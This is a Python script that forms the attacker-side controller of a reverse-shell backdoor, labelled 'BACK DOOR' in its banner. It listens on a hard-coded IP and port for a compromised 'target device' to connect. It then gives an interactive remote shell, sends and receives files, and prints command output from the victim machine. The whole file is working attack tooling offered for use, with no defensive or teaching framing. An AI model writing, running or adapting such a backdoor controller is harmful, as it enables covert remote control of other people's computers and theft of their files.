import subprocess
import socket
import json
import pyfiglet
import os
import termcolor


# INCOMING + DECODING
def reliable_recv():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


# OUTGOING + ENCODE
def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())


# UPLOAD FILE
def upload_file(file_name):
    f = open(file_name, 'rb')
    target.send(f.read())

# DOWNLOAD FILE
def download_file(file_name):
    f = open(file_name, 'wb')
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()


# ONGOING COMMANDS
def target_communication():
    while True:
        shell_color = termcolor.colored(text='* Shell~%s: ', color="red")
        command = input(shell_color % str(ip))
        reliable_send(command)

        if command[:6] == 'uload':
            upload_file(command[7:])

        elif command[:6] == 'dload':
            download_file(command[7:])

        else:
            result = reliable_recv()
            print(result)


# INTRO
def intro_text():
    print("\n")
    print(termcolor.colored(text="[+]", color="red") * 17)
    print(termcolor.colored(text="*", color="red") * 50)
    print(termcolor.colored(text="*", color="yellow") * 50)
    print(termcolor.colored(text="*", color="red") * 50)
    print(termcolor.colored(text="~", color="blue") * 50)
    banner = pyfiglet.figlet_format("BACK DOOR")
    print(termcolor.colored(text=banner, color="green"))
    print(termcolor.colored(text="MADE BY TUSHAR GAUR", color="red"))
    print("\n")
    print(termcolor.colored(text=" [+] WAITING FOR TARGET DEVICE TO CONTACT", color="yellow"))


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(("192.46.208.167", 5555))
sock.listen(5)
intro_text()
target, ip = sock.accept()
print(" [~] TARGET CONNECTED LHOST:  " + str(ip), " LPORT: 9000")
target_communication()
